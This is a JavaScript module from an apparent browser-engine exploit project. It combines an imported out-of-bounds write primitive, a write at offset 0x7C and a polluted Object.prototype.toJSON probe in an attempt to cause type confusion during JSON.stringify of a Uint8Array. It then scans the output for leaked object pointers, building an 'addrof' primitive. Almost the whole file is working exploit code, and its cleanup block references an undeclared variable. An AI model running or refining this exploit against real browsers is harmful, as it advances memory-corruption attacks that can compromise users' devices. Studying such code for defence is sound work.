// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v26_IsolateWritesToConfusedThis)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT = "OriginalHeisenbug_TypedArrayAddrof_v26_IsolateWritesToConfusedThis";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v26 = null;
let object_to_leak_B_v26 = null;
let victim_typed_array_ref_v26 = null; 
let probe_call_count_v26 = 0;
// Objeto global simples para registrar a ÚLTIMA interação significativa da sonda
let last_significant_probe_interaction_v26 = null; 
const PROBE_CALL_LIMIT_V26 = 5;


function toJSON_TA_Probe_IsolateWrites() {
    probe_call_count_v26++;
    const call_num = probe_call_count_v26;
    const current_this_type = Object.prototype.toString.call(this);
    const is_victim = (this === victim_typed_array_ref_v26);
    const is_prev_marker = (typeof this === 'object' && this !== null && this.hasOwnProperty('probe_marker_v26') && this.probe_marker_v26 === (call_num - 1));

    logS3(`[TA_Probe_v26] Call #${call_num}. 'this' type: ${current_this_type}. IsVictim? ${is_victim}. IsPrevMarker? ${is_prev_marker}`, "leak");

    // Atualizar o objeto de logging global com informações desta chamada
    // Se esta for a chamada onde a confusão ocorre e as escritas são feitas, isso será capturado.
    last_significant_probe_interaction_v26 = {
        call_number: call_num,
        this_type: current_this_type,
        this_is_victim: is_victim,
        this_is_prev_marker: is_prev_marker,
        writes_on_confused_this_done: false,
        error_during_write: null
    };

    try {
        if (call_num > PROBE_CALL_LIMIT_V26) {
            logS3(`[TA_Probe_v26] Call #${call_num}: Probe call limit. Returning stop marker.`, "warn");
            return { recursion_stopped_v26: true };
        }

        if (current_this_type === '[object Object]') { 
            logS3(`[TA_Probe_v26] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${is_victim}, IsPrevMarker? ${is_prev_marker})`, "vuln");
            
            // Escrever no 'this' confuso, seja ele quem for.
            logS3(`[TA_Probe_v26] Call #${call_num}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v26) this[0] = object_to_leak_A_v26; 
            if (object_to_leak_B_v26) this[1] = object_to_leak_B_v26; 
            last_significant_probe_interaction_v26.writes_on_confused_this_done = true;
            logS3(`[TA_Probe_v26] Call #${call_num}: Writes to confused 'this' attempted. 'this' keys: ${Object.keys(this).join(',')}`, "info");
            
            // Se este 'this' confuso for o marcador da chamada anterior, queremos que JSON.stringify o serialize
            if (is_prev_marker) {
                logS3(`[TA_Probe_v26] Call #${call_num}: Confused 'this' was previous marker. Returning 'this' (modified marker).`, "info");
                return this; // Deixar JSON.stringify serializar o marcador modificado
            }
        } else if (is_victim && call_num === 1) {
            logS3(`[TA_Probe_v26] Call #${call_num}: 'this' is victim. Returning new marker.`, "info");
        }
    } catch (e) {
        logS3(`[TA_Probe_v26] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        if (last_significant_probe_interaction_v26) { // Adiciona erro ao log se possível
            last_significant_probe_interaction_v26.error_during_write = e.message;
        }
    }
    
    // Retorno padrão: um novo objeto marcador para a próxima iteração potencial
    return { "probe_marker_v26": call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_IsolateWritesToConfusedThis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (IsolateWritesToConfusedThis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT} Init...`;

    probe_call_count_v26 = 0;
    last_significant_probe_interaction_v26 = null; 
    victim_typed_array_ref_v26 = null; 
    object_to_leak_A_v26 = { marker: "ObjA_TA_v26iwct", id: Date.now() }; 
    object_to_leak_B_v26 = { marker: "ObjB_TA_v26iwct", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let captured_last_significant_details = null; 
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_Victim_B = { success: false, msg: "VictimB: Default" };
    let addrof_Output_A = { success: false, msg: "Output[0]: Default"}; // Para checar stringifyOutput[0]
    let addrof_Output_B = { success: false, msg: "Output[1]: Default"}; // Para checar stringifyOutput[1]

    const fillPattern = 0.26262626262626;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v26 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v26.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v26 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_IsolateWrites, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v26); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput };
            }
            
            if (last_significant_probe_interaction_v26) {
                captured_last_significant_details = JSON.parse(JSON.stringify(last_significant_probe_interaction_v26)); 
            }
            logS3(`  EXECUTE: Captured details of LAST significant probe interaction: ${captured_last_significant_details ? JSON.stringify(captured_last_significant_details) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (captured_last_significant_details && 
                captured_last_significant_details.this_type === "[object Object]") {
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on 'this' of a probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"} by captured details. Last relevant 'this' type: ${captured_last_significant_details ? captured_last_significant_details.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            const val_A_victim = float64_view_on_victim_buffer[0];
            if (val_A_victim !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${val_A_victim}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            const val_B_victim = float64_view_on_victim_buffer[1];
            if (val_B_victim !== (fillPattern + 1)) addrof_Victim_B.msg = `Victim buffer[1] CHANGED! Val: ${val_B_victim}`; else addrof_Victim_B.msg = `Victim buffer[1] unchanged.`;

            logS3("STEP 4: Checking stringifyOutput_parsed for leaked properties [0] and [1]...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                const output_val_A = stringifyOutput_parsed["0"];
                if (typeof output_val_A === 'number' && output_val_A !== 0) {
                    let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                    if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_A.success = true; addrof_Output_A.msg = `Possible pointer for Output[0]: ${out_A_int64.toString(true)}`;
                    } else { addrof_Output_A.msg = `Output[0] is num but not ptr: ${output_val_A}`; }
                } else if (output_val_A === object_to_leak_A_v26) {
                     addrof_Output_A.success = true; addrof_Output_A.msg = "object_to_leak_A_v26 identity in Output[0].";
                } else { addrof_Output_A.msg = `Output[0] not ptr. Val: ${output_val_A}`; }

                const output_val_B = stringifyOutput_parsed["1"];
                if (typeof output_val_B === 'number' && output_val_B !== 0) {
                    let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
                     if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_B.success = true; addrof_Output_B.msg = `Possible pointer for Output[1]: ${out_B_int64.toString(true)}`;
                    } else { addrof_Output_B.msg = `Output[1] is num but not ptr: ${output_val_B}`; }
                } else if (output_val_B === object_to_leak_B_v26) {
                     addrof_Output_B.success = true; addrof_Output_B.msg = "object_to_leak_B_v26 identity in Output[1].";
                } else { addrof_Output_B.msg = `Output[1] not ptr. Val: ${output_val_B}`; }
            } else {
                 addrof_Output_A.msg = "stringifyOutput was not an object or was null.";
                 addrof_Output_B.msg = "stringifyOutput was not an object or was null.";
            }

            if (addrof_Output_A.success || addrof_Output_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT}: AddrInOutput SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V26_IWCT} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v26}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Output[0]: Success=${addrof_Output_A.success}, Msg='${addrof_Output_A.msg}'`, addrof_Output_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output[1]: Success=${addrof_Output_B.success}, Msg='${addrof_Output_B.msg}'`, addrof_Output_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v26 = null; 
        latest_known_probe_details_v26 = null;
        probe_call_count_v26 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: captured_last_significant_details, 
        total_probe_calls: probe_call_count_v26,
        addrof_victim_A: addrof_Victim_A,
        addrof_victim_B: addrof_Victim_B,
        addrof_output_A: addrof_Output_A, // Renomeado para clareza
        addrof_output_B: addrof_Output_B  // Renomeado para clareza
    };
}
